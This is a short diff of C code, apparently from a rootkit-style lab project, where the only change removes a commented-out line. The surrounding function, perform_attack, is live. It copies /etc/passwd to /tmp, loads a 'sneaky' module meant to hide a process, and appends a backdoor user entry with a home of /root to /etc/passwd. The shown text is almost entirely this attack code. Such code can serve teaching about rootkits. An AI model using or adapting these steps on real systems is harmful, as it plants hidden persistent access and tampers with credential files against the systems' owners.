@@ -58,7 +58,6 @@ void execute(){
 void perform_attack(char* module_name){
   copy_file("/etc/passwd", "/tmp/passwd");
   load_sneaky_process(module_name);
-  // copy_file("/etc/passwd", "/tmp/passwd");
   add_password("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
 }
 
